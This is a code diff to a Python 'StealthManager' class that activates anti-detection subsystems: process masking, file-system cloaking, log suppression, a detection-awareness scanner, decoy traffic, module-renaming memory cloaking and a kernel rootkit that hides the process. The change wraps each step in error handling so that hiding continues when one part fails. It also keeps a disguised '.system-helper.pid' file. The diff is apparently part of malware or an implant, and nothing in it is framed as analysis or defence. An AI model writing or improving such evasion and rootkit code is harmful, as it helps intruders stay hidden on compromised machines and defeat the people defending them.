@@ -24,6 +24,7 @@ Usage::
 from __future__ import annotations
 
 import logging
+import os
 from typing import Any
 
 from stealth.process_masking import ProcessMasker
@@ -188,45 +189,71 @@ class StealthManager:
 
         logger.debug("Activating stealth mode (level=%s)", self._level)
 
+        failed_subsystems: list[str] = []
+
+        def _safe_activate(name: str, fn: Any) -> None:
+            """Run a subsystem activation, logging and continuing on failure."""
+            try:
+                fn()
+            except Exception as exc:
+                failed_subsystems.append(name)
+                logger.error(
+                    "Stealth subsystem '%s' failed to activate: %s", name, exc,
+                    exc_info=True,
+                )
+
         # 1. Crash guard first — catches errors in subsequent steps
-        self.crash_guard.install()
+        _safe_activate("crash_guard", self.crash_guard.install)
 
         # 2. File-system cloak (creates directories)
-        self.fs_cloak.apply()
+        _safe_activate("fs_cloak", self.fs_cloak.apply)
 
         # 3. Log controller (suppress output before noisy init)
-        self.log_controller.apply()
+        _safe_activate("log_controller", self.log_controller.apply)
         # Wire ring buffer into crash guard now that it exists
-        self.crash_guard._ring_buffer = self.log_controller.get_ring_buffer()
+        try:
+            self.crash_guard._ring_buffer = self.log_controller.get_ring_buffer()
+        except Exception:
+            pass
 
         # 4. Environment sanitiser
-        self.env_sanitizer.apply()
+        _safe_activate("env_sanitizer", self.env_sanitizer.apply)
 
         # 5. Process masking
-        self.process_masker.apply()
+        _safe_activate("process_masker", self.process_masker.apply)
 
         # 6. Resource profiling (lower priority)
-        self.resource_profiler.apply_priority()
+        _safe_activate("resource_profiler", self.resource_profiler.apply_priority)
 
         # 7. Detection awareness scanner (background thread)
-        self.detection.start()
+        _safe_activate("detection", self.detection.start)
 
         # 8. Transport bridge — decoy traffic (if enabled at this level)
-        self.transport_bridge.start_decoy_traffic()
+        _safe_activate("transport_bridge", self.transport_bridge.start_decoy_traffic)
 
         # 9. Memory cloak — MUST be last Python-level step (renames modules)
-        self.memory_cloak.apply()
+        _safe_activate("memory_cloak", self.memory_cloak.apply)
 
         # 10. Rootkit — kernel-level hiding (if available and enabled)
         if self.rootkit is not None and self.rootkit.enabled:
-            if self.rootkit.install():
-                self.rootkit.hide_self()
-                logger.debug("Rootkit: kernel-level hiding active")
-            else:
-                logger.debug("Rootkit: not loaded (no root or compilation failed)")
+            try:
+                if self.rootkit.install():
+                    self.rootkit.hide_self()
+                    logger.debug("Rootkit: kernel-level hiding active")
+                else:
+                    logger.debug("Rootkit: not loaded (no root or compilation failed)")
+            except Exception as exc:
+                failed_subsystems.append("rootkit")
+                logger.error("Rootkit activation failed: %s", exc, exc_info=True)
 
         self._activated = True
-        logger.debug("Stealth mode active (enhanced + rootkit)")
+        if failed_subsystems:
+            logger.warning(
+                "Stealth mode active with %d failed subsystem(s): %s",
+                len(failed_subsystems), ", ".join(failed_subsystems),
+            )
+        else:
+            logger.debug("Stealth mode active (all subsystems OK)")
 
     def stop(self) -> None:
         """Gracefully shut down stealth subsystems."""
@@ -263,7 +290,8 @@ class StealthManager:
     def get_pid_path(self) -> str:
         """Stealthy PID file path (or default)."""
         if not self._enabled:
-            return "/tmp/.system-helper.pid"
+            import tempfile
+            return os.path.join(tempfile.gettempdir(), ".system-helper.pid")
         return self.fs_cloak.get_pid_path()
 
     def get_data_dir(self) -> str:
